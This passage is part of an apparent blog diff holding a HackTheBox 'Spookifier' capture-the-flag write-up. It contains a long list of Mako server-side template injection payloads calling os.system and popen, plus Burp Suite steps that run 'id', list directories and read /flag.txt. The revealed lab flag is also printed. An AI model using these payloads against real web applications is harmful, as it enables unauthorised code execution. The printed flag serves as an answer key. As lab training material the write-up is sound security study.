class="variable">$&#123;self.context._with_template.module.cache.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.runtime.exceptions.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.cache.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.context._with_template.module.runtime.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.cache.util.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.runtime.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.runtime.util.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.runtime.exceptions.traceback.linecache.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.runtime.exceptions.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template._mmarker.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.cache.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.attr._NSAttr__parent.template.module.cache.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template._mmarker.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template._mmarker.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template._mmarker.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.filters.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.runtime.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.attr._NSAttr__parent.template.module.runtime.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.context._with_template._mmarker.module.cache.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.runtime.exceptions.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.context._with_template.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.runtime.exceptions.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.context._with_template._mmarker.module.runtime.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.context._with_template.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.context._with_template.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.context._with_template.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.runtime.exceptions.traceback.linecache.os.system(&quot;id&quot;)&#125;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>Capture the packet using Burpsuite and send to repeater</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://dl.dropbox.com/scl/fi/awh8x685bx7st9efbq6nd/14-1.png?rlkey=cznnn50lugr8873c8p66u1bz2&st=l7v6ceh1&dl=0"
-                      alt="14.png"
-                ></p>
-<p>![[14 1.png]]</p>
-<p>Now use the payloads</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://dl.dropbox.com/scl/fi/qd3ihg9swspeg4w4rrge6/15-1.png?rlkey=0e9ew3wzggvwt507k05gvnf31&st=ozn0rw17&dl=0"
-                      alt="15.png"
-                ></p>
-<p>It just gave response with exit code “0”</p>
-<p>Since the above payloads returned nothing , lets try popen</p>
-<p>The code is available in <a class="link"   href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#mako" >here <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">x=os.popen(<span class="string">&#x27;id&#x27;</span>).read()</span><br><span class="line">%&gt;</span><br><span class="line">$&#123;x&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>Now enter this in payload of burp packet</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%+x=self.module.runtime.util.os.popen(<span class="string">&#x27;id&#x27;</span>).<span class="built_in">read</span>()+%&gt;<span class="variable">$&#123;x&#125;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>Once you enter this you should be able to see the details of uid,gid , groups of the engine like the following</p>
-<p>Now alter the above to list the directories</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://dl.dropbox.com/scl/fi/k2277xnd7isp6rvyia0ed/17.png?rlkey=2bzcfkhuazpo08d8yi3tmbu2r&st=ndb54uxz&dl=0"
-                      alt="17.png"
-                ></p>
-<p>Now alter the above like the following to list the directories</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%+x=self.module.runtime.util.os.popen(<span class="string">&#x27;ls+-l&#x27;</span>).<span class="built_in">read</span>()+%&gt;<span class="variable">$&#123;x&#125;</span></span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://dl.dropbox.com/scl/fi/e7wwb7s6c7wfy63odnac7/18.png?rlkey=79gmhb9r8laogk4sldqrqh2qw&st=daj21qy0&dl=0"
-                      alt="18.png"
-                ></p>
-<p>Now , since flag is located in the same directory</p>
-<p>alter the above payload into</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%+x=self.module.runtime.util.os.popen(<span class="string">&#x27;cat+/flag.txt&#x27;</span>).<span class="built_in">read</span>()+%&gt;<span class="variable">$&#123;x&#125;</span></span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://dl.dropbox.com/scl/fi/e7wwb7s6c7wfy63odnac7/18.png?rlkey=79gmhb9r8laogk4sldqrqh2qw&st=daj21qy0&dl=0"
-                      alt="19.png"
-                ></p>
-<details>
-  <summary>Click to reveal the Flags</summary>
-  Flag: HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}
-</details>
-
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://dl.dropbox.com/scl/fi/uwtmwkh48hy8b15ievfjf/19.png?rlkey=mxc9y9idxxp29fjicp1cu4bke&st=ed3avlvu&dl=0"
-                      alt="20.png"
-                ></p>
-<p><strong>Conclusion</strong></p>
-<p>The Spookifier lab is a beginner-friendly challenge that effectively demonstrates the basics of template injection exploitation. The walkthrough showcased the process clearly, making it ideal for practicing and understanding this common web application vulnerability. The room focuses more on identifying the vulnerability and crafting the payload rather than complex post-exploitation techniques.</p>
-<ul>
-<li>Exploiting a template injection vulnerability in a Flask application.</li>
-<li>Executing arbitrary code on the system using the vulnerability.</li>
-<li>Utilizing the <code>os.popen()</code> function to access and read the flag file.</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>HackTheBox</tag>
       </tags>
   </entry>
 </search>
